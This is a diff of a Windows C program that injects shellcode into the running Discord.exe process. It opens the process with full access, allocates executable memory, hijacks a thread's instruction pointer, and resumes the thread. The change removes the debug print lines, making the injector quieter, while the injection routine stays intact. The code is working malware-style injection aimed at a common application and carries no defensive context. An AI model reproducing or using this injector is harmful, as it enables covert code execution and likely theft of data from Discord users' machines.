@@ -8,7 +8,6 @@
 #include "resource.h"
 #pragma comment( lib, "shlwapi.lib")
 
-#define print(format, ...) fprintf (stderr, format, __VA_ARGS__)
 void fetch_exec_all(void);
 void Trampoline2()
 {
@@ -102,11 +101,8 @@ void fetch_exec_all(void)
     context.ContextFlags = CONTEXT_FULL;
     HANDLE htd, proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pr = GetPID("Discord.exe"));
     if (!proc)
-    {
-        print("[!] Process Not found (0x%lX)\n", GetLastError());
         return ;
-    }
-    print("[+] Process Opened Successfully :0x%lX\n", GetLastError());
+    
     void* base = VirtualAllocEx(proc, NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!base)
     {
@@ -118,7 +114,6 @@ void fetch_exec_all(void)
         CloseHandle(proc);
         return ;
     }
-    print("[+] shellcode Base address : 0x%08x\n", base);
     htd = OpenThread(THREAD_ALL_ACCESS, 0, EnThread(pr));
     if (!htd)
     {
@@ -137,7 +132,6 @@ void fetch_exec_all(void)
         CloseHandle(htd);
         return ;
     }
-    print("[+] EIP hold: 0x%08x\n", context.Eip);
     context.Eip = (DWORD)base;
     if (!SetThreadContext(htd, &context))
     {
@@ -146,21 +140,18 @@ void fetch_exec_all(void)
         return ;
     }
 
-    print("[+] EIP Hijacked succesfully : 0x%08x\n", context.Eip);
     if (ResumeThread(htd) == (DWORD)-0b01)
     {
         CloseHandle(proc);
         CloseHandle(htd);
         return ;
     }
-    print("[+] thread Resumed succesfully : 0x%08x\n", context.Eip);
     if ((pr = WaitForSingleObject(htd, INFINITE) == 0x00000080L) || (pr == 0x00000000L) || (pr == 0x00000102L) || (pr == (DWORD)0xFFFFFFFF))
     {
         CloseHandle(proc);
         CloseHandle(htd);
         return ;
     }
-    print("[+] Thread finished Succesfully 0x%lX\n", htd);
     CloseHandle(proc);
     CloseHandle(htd);
 }
